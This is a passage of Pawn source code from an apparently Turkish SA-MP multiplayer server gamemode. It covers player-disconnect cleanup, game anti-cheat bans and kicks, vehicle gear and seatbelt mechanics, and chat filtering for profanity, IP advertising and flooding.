	new Name[24], Msg[256]/*, HouseID*/;

	// Get the playername
	GetPlayerName(playerid, Name, sizeof(Name));

		new playerName[MAX_PLAYER_NAME];

    GetPlayerName(playerid, playerName, MAX_PLAYER_NAME);

    new szDisconnectReason[3][] =
    {
        "(Hata/Crash)",
        "(KendI IstegIyle)",
        "(Kick/Ban)"
    };

	format(Msg, 256, "%s(%d) oyundan cIktI %s (IP: %s)", GetName(playerid), playerid, szDisconnectReason[reason], GetIP2(playerid));
	LOG(Msg);

	// Send a message to all players to let them know somebody left the server
	format(Msg, 256, "~r~~h~%s(%d)~w~ sunucudan ayrIldI ~r~~h~%s", Name, playerid, szDisconnectReason[reason]);
	if(CikisYazdir[playerid] == true) SendDuyuruText(Msg);
	CikisYazdir[playerid] = true;
	
	// Balon Sistemi
	if(Balonda[playerid] == true)
	{
	    BalonSil(playerid);
	}

	// Kar Sistemi
	if(snowOn{playerid})
	{
	    for(new i = 0; i < MAX_SNOW_OBJECTS; i++) DestroyDynamicObject(snowObject[playerid][i]);
		snowOn{playerid} = false;
		KillTimer(updateTimer{playerid});
	}

	// FPS Kamerasý
	if(OyuncuAFPS[playerid] == 1)
	{
		OyuncuAFPS[playerid] = 0;
		SetCameraBehindPlayer(playerid);
		DestroyObject(OyuncuAFPS_Obje[playerid]);
	}

	// Arkadaþlýk Sistemi
 	ArkKayit(playerid);

	// If the player entered a proper password (the player has an account)
	if (APlayerData[playerid][LoggedIn] == true)
	{
		getdate(pInfo[playerid][pSYil], pInfo[playerid][pSAy], pInfo[playerid][pSGun]);

		// Araç Sahiplik Sistemi
		foreach(new AracID:ASHPs)
		{
  			new pName[254];
	    	GetPlayerName(playerid, pName, sizeof(pName));
		    if(!strcmp(AracSHP[AracID][ASHPSahip], pName, true))
		    {
				AracOKaydet(AracID);
				SetTimerEx("Destroy_Vehicle", 900, false, "i", AracSHP[AracID][ASHPVehID]);
    		}
		}
	
	    // Save the player data and his houses
		Oyuncu_Kaydet(playerid, true);
		APlayerData[playerid][LoggedIn] = false;
	}

    APlayerData[playerid][Muted] = 0;

	// Stop any job that may have started (this also clears all mission data)
	switch (APlayerData[playerid][PlayerClass])
	{
		case ClassTruckDriver: { Trucker_EndJob(playerid); }// Stop any trucker job
 		case ClassBusDriver: { BusDriver_EndJob(playerid); }// Stop any pilot job
 		case ClassDolmusDriver: { DolmusDriver_EndJob(playerid); }// Stop any pilot job
		case ClassPilot: { Pilot_EndJob(playerid); }// Stop any pilot job
		case ClassPolice: { Police_EndJob(playerid); }// Stop any police job
		case ClassMafia: { Mafia_EndJob(playerid); }// Stop any mafia job
		case ClassRoadWorker: { Roadworker_EndJob(playerid); }
 		case ClassGemici: { Gemici_EndJob(playerid); }// Stop any pilot job
 		case ClassOduncu: { Oduncu_EndJob(playerid); }// Stop any pilot job
 		case ClassBalikci: { Balikci_EndJob(playerid); }// Stop any pilot job
 		case ClassCopcu: { StopCopcuGorev(playerid); } // Stop any G job	}
 		case ClassBanka: { Banka_EndJob(playerid); } // Stop any G job	}
 		case ClassFire: { Fire_EndJob(playerid); } // Stop any G job	}
 		case ClassFBY: { FBY_EndJob(playerid); } // Stop any FBY job
 		case ClassPboy: { Pboy_EndJob(playerid); } // Stop any FBY job
 		case ClassKargocu:
 		{
   			if(KargoOrtak[playerid] != -1)
		    {
				BILGI(KargoOrtak[playerid], "{FFCC00}» {FFFFFF}Ortaðýnýz oyundan çýktýðý için görev iptal oldu.");
			}
			StopKargocuGorev(playerid);
 		}
	}
	// If the player is part of a convoy, kick him from it
	Convoy_Leave(playerid);

	// Make sure the jailtimer has been destroyed
	KillTimer(APlayerData[playerid][PlayerJailedTimer]);
	KillTimer(APlayerData[playerid][Timer_PoliceCanJailMe]);
	KillTimer(APlayerData[playerid][Timer_FBYCanJailMe]);

	// Destroy the speedometer TextDraw for this player and the timer, also set the speed to 0
	Speedometer_Cleanup(playerid);

	// Also destroy the missiontext TextDraw for this player
	//TextDrawDestroy(APlayerData[playerid][MissionText]);

	// Þirket Sistemif
	if(TSirketDurum[playerid] == 5) DestroyDynamicObject(TSirketKapi[playerid]);
	if(SirketDorse[playerid] != -1) { DestroyVehicle(SirketDorse[playerid]); SirketDorse[playerid] = -1; }

	// BoomBox Sistemi
	if(OyuncuBB[playerid] != -1)
	{
	    DestroyBoomBox(OyuncuBB[playerid]);
	    OyuncuBB[playerid] = -1;
	}

	if(EditingBBObject[playerid] != -1)
	{
	    DestroyDynamicObject(EditingBBObject[playerid]);
	}

	// Puþt Tabela Sistemi
	if(pObj[playerid] != -255){
	DestroyObject(pObj[playerid]);
	pObj[playerid] = -255;
	format(pObjText[playerid], 128, "");
	}

	// Giþe Sistemi
	if(GiseEkliyor[playerid] == true)
	{
	    GiseEkliyor[playerid] = false;
	    DestroyObject(SecilenGiseObject[playerid]);
	}
	//TextDrawHideForPlayer(playerid, Time), TextDrawHideForPlayer(playerid, Date);

	// Ahýr Sistemi & Animasyonlar
	if(Ahirin[playerid] != -1)
	{
	    TogglePlayerControllable(AhirKurban[ Ahirin[playerid] ], 1);
	    AhirKurban[ Ahirin[playerid] ] = -1;
		Ahirin[playerid] = -1;
	}

	if(AhirKurban[playerid] != -1)
	{
	    Ahirin[ AhirKurban[playerid] ] = -1;
	    AhirKurban[playerid] = -1;
	}

	// Unload all the player's house-vehicles to make room for other player's vehicles
/*	new HouseID;
	Player_LoadHouses(playerid);
	for (new HouseSlot; HouseSlot < MAX_HOUSESPERPLAYER; HouseSlot++)
	{
	    // Get the HouseID from this slot
	    HouseID = APlayerData[playerid][Houses][HouseSlot];
	    // Check if there is a house in this slot
		if (HouseID != 0)
		{
		    House_RespawnVehicles(HouseID);
		    // Unload the cars of the house
		    //House_RemoveVehicles(HouseID);
			// Set the house so it cannot be entered by anyone (close the house)
			//AHouseData[HouseID][HouseOpened] = false;
		}
	}

	Player_ResetHouses(playerid);*/
	Player_ResetBusiness(playerid);
	/*
	for (new HouseSlot; HouseSlot < MAX_HOUSESPERPLAYER; HouseSlot++)
		APlayerData[playerid][Houses][HouseSlot] = 0;
	for (new BusSlot; BusSlot < MAX_BUSINESSPERPLAYER; BusSlot++)
		APlayerData[playerid][Business][BusSlot] = 0;
	*/
	APlayerData[playerid][CurrentHouse] = 0;

	// Destroy a rented vehicle is the player had any
	if (APlayerData[playerid][RentedVehicleID] != 0)
	{
		// Clear the data for the already rented vehicle
		AVehicleData[APlayerData[playerid][RentedVehicleID]][Model] = 0;
		AVehicleData[APlayerData[playerid][RentedVehicleID]][Fuel] = 0;
		AVehicleData[APlayerData[playerid][RentedVehicleID]][Owned] = false;
		AVehicleData[APlayerData[playerid][RentedVehicleID]][Owner] = 0;
		AVehicleData[APlayerData[playerid][RentedVehicleID]][PaintJob] = 0;
		for (new j; j < 14; j++)
		{
			AVehicleData[APlayerData[playerid][RentedVehicleID]][Components][j] = 0;
		}
		// Destroy the vehicle
 		if(Flashing[APlayerData[playerid][RentedVehicleID]] == true)
		{
	    	KillTimer(FlashTime[APlayerData[playerid][RentedVehicleID]]);
	    	Flashing[APlayerData[playerid][RentedVehicleID]] = false;
		}

		DestroyVehicle(APlayerData[playerid][RentedVehicleID]);
		// Clear the RentedVehicleID
		APlayerData[playerid][RentedVehicleID] = 0;
	}

	// Stop spectate mode for all players who are spectating this player
	for (new i; i < MAX_PLAYERS; i++)
	    if (IsPlayerConnected(i)) // Check if the player is connected
	        if (GetPlayerState(i) == PLAYER_STATE_SPECTATING) // Check if this player is spectating somebody
	            if (APlayerData[i][SpectateID] == playerid) // Check if this player is spectating me
		   		{
					TogglePlayerSpectating(i, 0); // Turn off spectate-mode
					APlayerData[i][SpectateID] = -1;
					APlayerData[i][SpectateType] = ADMIN_SPEC_TYPE_NONE;
					SendClientMessage(i, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Adam Oyundan Cýktý , Spec Kapatiliyor");
				}

    	for(new i; i < MAX_VEHICLES; i++)
		{
			if(VehicleIsLocked[i] == 1)
	  		{
					    VehicleIsLocked[i] = 0;
			}
		}

	// HGS
	/*if(MoneyTimer[playerid] > -1)
	{
    KillTimer(MoneyTimer[playerid]);
    MoneyTimer[playerid] = -1;
	}*/
	return 1;
}

forward SusAmk(playerid);
public SusAmk(playerid)
{
	SetTimerEx("KonusAmk", 2000, false, "i", playerid);
	return 1;
}


stock HileciyiYasakla(playerid, aldigisilah)
{
	new silahismi[64];
	new string[256];
	new isim[MAX_PLAYER_NAME];
	GetPlayerName(playerid, isim, sizeof(isim));
	GetWeaponName(aldigisilah, silahismi, sizeof(silahismi));
	format(string, sizeof(string), "{F81414}(( {FFFFFF} ANTI HILE SISTEMI]:{F81414}%s{FFFFFF} adlý oyuncu sunucudan yasaklandý (Silah Hilesi(Silah: %s  {F81414}))",isim, silahismi);
	SendClientMessageToAll(-1, string);
	Ban(playerid);
	return 1;
}

stock OyuncuSilahDegistirdi(playerid, eskisilah, yenisilah)
{
    #pragma unused eskisilah
	if(OyuncununSilahlari[playerid][0] != 1 && GetPlayerWeapon(playerid) == 1 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][1] != 2 && GetPlayerWeapon(playerid) == 2 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][1] != 3 && GetPlayerWeapon(playerid) == 3 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][1] != 4 && GetPlayerWeapon(playerid) == 4 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][1] != 5 && GetPlayerWeapon(playerid) == 5 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][1] != 6 && GetPlayerWeapon(playerid) == 6 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][1] != 7 && GetPlayerWeapon(playerid) == 7 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][1] != 8 && GetPlayerWeapon(playerid) == 8 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][1] != 9 && GetPlayerWeapon(playerid) == 9 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][10] != 10 && GetPlayerWeapon(playerid) == 10 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][10] != 11 && GetPlayerWeapon(playerid) == 11 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][10] != 12 && GetPlayerWeapon(playerid) == 12 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][10] != 13 && GetPlayerWeapon(playerid) == 13 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][10] != 14 && GetPlayerWeapon(playerid) == 14 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][10] != 15 && GetPlayerWeapon(playerid) == 15 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][8] != 16 && GetPlayerWeapon(playerid) == 16 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][8] != 17 && GetPlayerWeapon(playerid) == 17 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][8] != 18 && GetPlayerWeapon(playerid) == 18 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][2] != 22 && GetPlayerWeapon(playerid) == 22 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][2] != 23 && GetPlayerWeapon(playerid) == 23 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][2] != 24 && GetPlayerWeapon(playerid) == 24 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][3] != 25 && GetPlayerWeapon(playerid) == 25 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][3] != 26 && GetPlayerWeapon(playerid) == 26 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][3] != 27 && GetPlayerWeapon(playerid) == 27 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][4] != 28 && GetPlayerWeapon(playerid) == 28 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][4] != 29 && GetPlayerWeapon(playerid) == 29 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][5] != 30 && GetPlayerWeapon(playerid) == 30 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][5] != 31 && GetPlayerWeapon(playerid) == 31 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][4] != 32 && GetPlayerWeapon(playerid) == 32 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][6] != 33 && GetPlayerWeapon(playerid) == 33 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][6] != 34 && GetPlayerWeapon(playerid) == 34 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][7] != 35 && GetPlayerWeapon(playerid) == 35 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][7] != 36 && GetPlayerWeapon(playerid) == 36 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][7] != 37 && GetPlayerWeapon(playerid) == 37 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][7] != 38 && GetPlayerWeapon(playerid) == 38 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][8] != 39 && GetPlayerWeapon(playerid) == 39 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][9] != 41 && GetPlayerWeapon(playerid) == 41 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][9] != 42 && GetPlayerWeapon(playerid) == 42 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][9] != 43 && GetPlayerWeapon(playerid) == 43 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][11] != 44 && GetPlayerWeapon(playerid) == 44 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	if(OyuncununSilahlari[playerid][11] != 45 && GetPlayerWeapon(playerid) == 45 && PlayerPBing[playerid] == false)
	{
	    HileciyiYasakla(playerid,yenisilah);
	}
	return 1;
}

stock SilahVer(playerid, Silah, Mermi)
{
	switch(Silah)
	{
	    case 0, 1:
	    {
     		OyuncununSilahlari[playerid][0] = Silah;
      		GivePlayerWeapon(playerid, Silah, Mermi);
	    }
	    case 2, 3, 4, 5, 6, 7, 8, 9:
	    {
		    OyuncununSilahlari[playerid][1] = Silah;
		    GivePlayerWeapon(playerid, Silah, Mermi);
	    }
	    case 22, 23, 24:
	    {
		    OyuncununSilahlari[playerid][2] = Silah;
		    GivePlayerWeapon(playerid, Silah, Mermi);
	    }
	    case 25, 26, 27:
	    {
		    OyuncununSilahlari[playerid][3] = Silah;
		    GivePlayerWeapon(playerid, Silah, Mermi);
	    }
	    case 28, 29, 32:
	    {
		    OyuncununSilahlari[playerid][4] = Silah;
		    GivePlayerWeapon(playerid, Silah, Mermi);
	    }
	    case 30, 31:
	    {
		    OyuncununSilahlari[playerid][5] = Silah;
		    GivePlayerWeapon(playerid, Silah, Mermi);
	    }
	    case 33, 34:
	    {
		    OyuncununSilahlari[playerid][6] = Silah;
		    GivePlayerWeapon(playerid, Silah, Mermi);
	    }
	    case 35, 36, 37, 38:
	    {
		    OyuncununSilahlari[playerid][7] = Silah;
		    GivePlayerWeapon(playerid, Silah, Mermi);
	    }
	    case 39, 16, 17, 18, 40:
	    {
		    OyuncununSilahlari[playerid][8] = Silah;
		    GivePlayerWeapon(playerid, Silah, Mermi);
	    }
	    case 41, 42, 43:
	    {
		    OyuncununSilahlari[playerid][9] = Silah;
		    GivePlayerWeapon(playerid, Silah, Mermi);
	    }
	    case 10, 11, 12, 13, 14, 15:
	    {
		    OyuncununSilahlari[playerid][10] = Silah;
		    GivePlayerWeapon(playerid, Silah, Mermi);
            }
	    case 44, 45, 46:
	    {
		    OyuncununSilahlari[playerid][11] = Silah;
		    GivePlayerWeapon(playerid, Silah, Mermi);
	    }
       }
    return 1;
}



forward KonusAmk(playerid);
public KonusAmk(playerid)
{
	MesajSustur[playerid] = 0;
}
new Float:CarHealth[MAX_PLAYERS];
public OnPlayerUpdate(playerid)
{
    	if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && Araclar[ GetPlayerVehicleID(playerid) ][AracInSHP] == true)
		{
			new id = GetPlayerVehicleID(playerid);
			if(id != -1 && CarUpdate[id] < tickcount())
			{
		            CarUpdate[id] = tickcount()+1000;
			  		AracSHP[Araclar[id][AracSHPID]][KM] += GetVehicleDistanceFromPoint(id,  CarLastPos[id][0], CarLastPos[id][1], CarLastPos[id][2]) / 5000;
					GetVehiclePos(id, CarLastPos[id][0], CarLastPos[id][1], CarLastPos[id][2]);
			}
		}
// ANTI
	static Float:PCam[3];
	new isim[MAX_PLAYER_NAME];
	GetPlayerName(playerid, isim, sizeof(isim));

	GetPlayerCameraPos(playerid, PCam[0], PCam[1], PCam[2]);
	if ( PCam[2] >= 20000.0 || PCam[2] < -20000.0 )
	{
		printf("[%s-ANTI] Kicking %i for %.1f Z cam Pos.",isim, playerid, PCam[2]);
		Kick(playerid);
	    return 0; //desync player
	}

	if(GetPlayerCameraMode(playerid) == 53)
    {
        new Float:kLibPos[3];
        GetPlayerCameraPos(playerid, kLibPos[0], kLibPos[1], kLibPos[2]);
        if ( kLibPos[2] < -50000.0 || kLibPos[2] > 50000.0 )
        {
            Kick(playerid);
            return 0;
        }
    }


//
	// Anti Troll
	new vid = GetPlayerVehicleID(playerid);
	if(vid > 0)
	{
	    if(vid != LastVehicleID33[playerid])
	    {
			if(GetTickCount() - VehicleIDChangeTime[playerid] < 5000)
			{
	        	VehicleIDChanges[playerid]++;
	            if(VehicleIDChanges[playerid] > MAX_VEHICLE_ID_CHANGES)
	            {
	                new Yazi[300];
 					format(Yazi, 300, "{FF4040}« Anti Hile » {48D1CC}%s {F8F8FF}sunucudan atýldý.( {FF4040}Troll Hack {F8F8FF})", GetName(playerid));
	   				SendClientMessageToAll(-1, Yazi);
			   		format(Yazi, 300, "(TROLL HACK) %s(%d) Kick", GetName(playerid), playerid);
			   		LOG(Yazi);
				    SafeKick(playerid);
					return 0;
	            }
			}
			else VehicleIDChanges[playerid] = 1;
	    }
	    LastVehicleID33[playerid] = vid;
        VehicleIDChangeTime[playerid] = GetTickCount();
    }




	// Sabit Hýz Sistemi Metin ile sabah sabah delirmeceler
	if(SabitHiz[playerid] > 0.0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
	    SetVehicleSpeed(GetPlayerVehicleID(playerid), SabitHiz[playerid]);
	}

		new gecerlisilah = GetPlayerWeapon(playerid);
		if(gecerlisilah != GetPVarInt(playerid, "OyuncuGecerliSilah"))
		{
		OyuncuSilahDegistirdi(playerid, GetPVarInt(playerid, "OyuncuGecerliSilah"), gecerlisilah);
 		SetPVarInt(playerid, "OyuncuGecerliSilah", gecerlisilah);
		}

//vites sistemi
	if(otovites[playerid] == 0)
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && !IsVehiclePlane(GetPlayerVehicleID(playerid)))
	 	{
			if(GetVehicleSpeed(GetPlayerVehicleID(playerid), 0) < 15 && PlayerGear[playerid] >= 3)
			{
			    //SendClientMessage(playerid,-1,"Araba Kalkmiyor Vites Kücültün");
			    ModifyVehicleSpeed(GetPlayerVehicleID(playerid), -5);
			    return 1;
			}
	   		if(GetVehicleSpeed(GetPlayerVehicleID(playerid), 0) > (PlayerGear[playerid] * 35))
	     	{
	      		if(!IsVehicleDrivingBackwards(GetPlayerVehicleID(playerid)))
	      		{
       				if(PlayerGear[playerid] == -1) return ModifyVehicleSpeed(GetPlayerVehicleID(playerid), - GetVehicleSpeed(GetPlayerVehicleID(playerid), 0));
	          	}
	      		new newspeed;
				newspeed = GetVehicleSpeed(GetPlayerVehicleID(playerid), 0) - (PlayerGear[playerid] * 35);
	   			ModifyVehicleSpeed(GetPlayerVehicleID(playerid), -newspeed);
	 		}
		}
	}

	//kemer
	if(IsPlayerInAnyVehicle(playerid) == 1 && SeatbeltStatus[playerid] == 0)
 	{
                    new Float:TempCarHealth;
                    GetVehicleHealth(GetPlayerVehicleID(playerid), TempCarHealth);
                    new Float:Difference = floatsub(CarHealth[playerid], TempCarHealth);
                    if((floatcmp(CarHealth[playerid], TempCarHealth) == 1) && (floatcmp(Difference,100.0) == 1))
                    {
                        Difference = floatdiv(Difference, 10.0);
                        new Float:OldHealth;
                        GetPlayerHealth(playerid, OldHealth);
                        SetPlayerHealth(playerid, floatsub(OldHealth, Difference));
                    }
                    CarHealth[playerid] = TempCarHealth;
            }
            else
            {
                    CarHealth[playerid] = 0.0;
  	}

	return 1;
}
stock spamProtect(playerid, const szSpam[], iTime) {

	static

		s_szPVar[32],

		s_iPVar

	;

	format(s_szPVar, sizeof(s_szPVar), "pv_iSpam_%s", szSpam);



	s_iPVar = GetPVarInt(playerid, s_szPVar);



	if((GetTickCount() - s_iPVar) < iTime * 1000) {

		return 0;

	} else {

		SetPVarInt(playerid, s_szPVar, GetTickCount());

	}

	return 1;

}

stock stringContainsIP(const szStr[])
{
    new
        iDots,
        i
    ;
    while(szStr[i] != EOS)
    {
        if('0' <= szStr[i] <= '9')
        {
            do
            {
                if(szStr[i] == '.')
                    iDots++;

                i++;
            }
            while(('0' <= szStr[i] <= '9') || szStr[i] == '.' || szStr[i] == ':');
        }
        if(iDots > 2)
            return 1;
        else
            iDots = 0;

        i++;
    }
    return 0;
}

forward DelayedBan(playerid);
public DelayedBan(playerid)
{
	new playerip1[16];
	new BanCmd1[255];
    GetPlayerIp(playerid, playerip1, sizeof(playerip1));
    format(BanCmd1, 24, "banip %s",playerip1);
	SendRconCommand(BanCmd1);
    Ban(playerid);
    Kick(playerid);
}

// This callback gets called whenever a player uses the chat-box
public OnPlayerText(playerid, text[])
{
  /*  if(APlayerData[playerid][PlayerScore] <= 9)
	{
	SendAdminText(playerid, "write", "params");
	SendClientMessage(playerid,0xFFFFFFFF, "{FFCC00}» {FFFFFF}Sohbet Ýçin {FFCC00}10 {FFFFFF}Skor olmalisniz Sorularniz icin {FFCC00}/pm {FFFFFF}atiniz {FFCC00}/yardim {FFFFFF}veya {FFCC00}/sorusor !!");
	return 0;
	}*/
    if(ServerAyarlari[ChatEngel] == 1) {
	SendClientMessage(playerid,0xFFFFFFFF, "{FFCC00}» {FFFFFF}CHAT ADMIN TARAFINDAN KAPATILMISTIR !!");
	return 0;
	}

	if(strfind(text, "amýnýza", true) != -1 || strfind(text, "yarrak", true) != -1 || strfind(text, "siktir", true) != -1 || strfind(text, "yavþak", true) != -1 || strfind(text, "ibne", true) != -1 || strfind(text, "anani", true) != -1 || strfind(text, "sikerim", true) != -1 || strfind(text, "orospu", true) != -1)
	{
    SendClientMessage(playerid,0xFFFFFFFF, "{FF0000}KUFUR YASAKTIR !!!");
    SendClientMessage(playerid,0xFFFFFFFF, "{FF0000}KUFUR YASAKTIR !!!");
    SendClientMessage(playerid,0xFFFFFFFF, "{FF0000}KUFUR YASAKTIR !!!");
	return 0;
	}

    if(strfind(text, "koyayým", true) != -1 || strfind(text, "koyarým", true) != -1 || strfind(text, "koyarim", true) != -1 || strfind(text, "amýna", true) != -1 || strfind(text, "amina", true) != -1 || strfind(text, "oç", true) != -1 || strfind(text, "o.ç", true) != -1 || strfind(text, "yavsak", true) != -1)
	{
 	SendClientMessage(playerid,0xFFFFFFFF, "{FFCC00}» {FFFFFF}KUFUR YASAKTIR !!!");
    SendClientMessage(playerid,0xFFFFFFFF, "{FFCC00}» {FFFFFF}KUFUR YASAKTIR !!!");
    SendClientMessage(playerid,0xFFFFFFFF, "{FFCC00}» {FFFFFF}KUFUR YASAKTIR !!!");
    return 0;
	}

    /*if(!spamProtect(playerid, "Chat",1))
	{
	new String[256];
	format(String, sizeof(String), "{ff0000}Lütfen Flood Yapmayýnýz.");
	SendClientMessage(playerid, -1, String);
	flood[playerid] ++;
 	return 0;
 	}*/

 	/*if(stringContainsIP(text))
		{
	    new szMsg[255];
	    GetPlayerName(playerid, szMsg, MAX_PLAYER_NAME);
	    format(szMsg, sizeof(szMsg), "{00ff00} %s {ff0000} REKLAM YAPMAK  YASAKTIR !!", szMsg);
	    SendClientMessage(playerid,-1,szMsg);
	    //Ban(playerid);

	    return 0;
		}
	*/
	// » Giriþ yapmamýþsa olacaklar:
	if (APlayerData[playerid][LoggedIn] == false)
	{
	    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Giriþ yapmadan konuþamazsýnýz!");
		return 0;
	}


	if (FloodZaman[playerid] != 0)
	{
		if(FloodUyari[playerid] < 3)
  		{
	    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {FFCC00} FLOOD {FFFFFF}Yapmayiniz !!!!");
	    FloodZaman[playerid] = 1;
	    FloodUyari[playerid]++;
	    }
	    else if(FloodUyari[playerid] == 3)
	    {
	    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Lutfen {ffCC00} FLOOD {FFFFFF}Yapmayiniz {FFCC00}120 {FFFFFF}SANÝYE SUSTURULDUNUZ  {FFCC00} !!!!");
	    APlayerData[playerid][Muted] = 120;
	    }
		return 0;
	}


	// » Spawn olmamýþsa olacaklar:
	if (APlayerSpawnData[playerid] == false)
	{
	    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Spawn olmadan konuþamazsýnýz!");
		return 0;
	}

	// » Susturma mesajý:
    if (APlayerData[playerid][Muted] > 0)
	{
		SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Susturuldunuz Konusamazsýnýz !");
		return 0;
	}


	if(stringContainsIP(text))
	{
	    new rYazi[255];
	    /*new
	        szMsg[128];
	    GetPlayerName(playerid, szMsg, MAX_PLAYER_NAME);*/
	 	for (new admid; admid < MAX_PLAYERS; admid++)
		{
		    if (APlayerData[admid][PlayerLevel] >= 1 || Root[admid] == 1 )
		    {
				format(rYazi,255,"{FF0000}ANTI REKLAM: {00FF00}%s: {F8F8FF}%s", GetName(playerid), text);
				SendClientMessage(admid,-1,rYazi);
		    }
		}
        SendReportToAdmins(playerid, "Reklam");
	    /*format(szMsg, sizeof(szMsg), "%s Git Baska yerde Reklam yap Lan =))!", szMsg);
	    SendClientMessage(playerid,0xFF0000FF, szMsg);*/
	    //Ban(playerid);

	    return 0;
	}

/*
	if(Radio_viewing[playerid] == 1)
	{
		if(IsNumeric(text))
		{
			new input = strval(text);
			switch(input)
			{
				case 1:
				{
						SendClientMessage(playerid,COLOR_SKYBLUE,"RADYO FENOMEN DINLIYORSUNUZ");
						PlayAudioStreamForPlayer(playerid, "http://sc.powergroup.com.tr/RadyoFenomen/mpeg/128/tunein", 0, 0, 0, 0);
						HideRadioTextdraws(playerid);
						Radio_on[playerid] = 1;
						OyuncuRadyoda[playerid] = 1;
						return 0;
				}
				case 2:
				{
						SendClientMessage(playerid,COLOR_SKYBLUE,"METRO FM DINLIYORSUNUZ");
						PlayAudioStreamForPlayer(playerid, "http://10163.live.streamtheworld.com:3690/METRO_FM_SC", 0, 0, 0, 0);
						HideRadioTextdraws(playerid);
						Radio_on[playerid] = 1;
  						OyuncuRadyoda[playerid] = 1;
						return 0;
				}
				case 3:
				{
						SendClientMessage(playerid,COLOR_SKYBLUE,"Radyo Beyaz Dinliyorsunuz.");
						PlayAudioStreamForPlayer(playerid, "http://radyo.normworks.com:8000", 0, 0, 0, 0);
						HideRadioTextdraws(playerid);
						Radio_on[playerid] = 1;
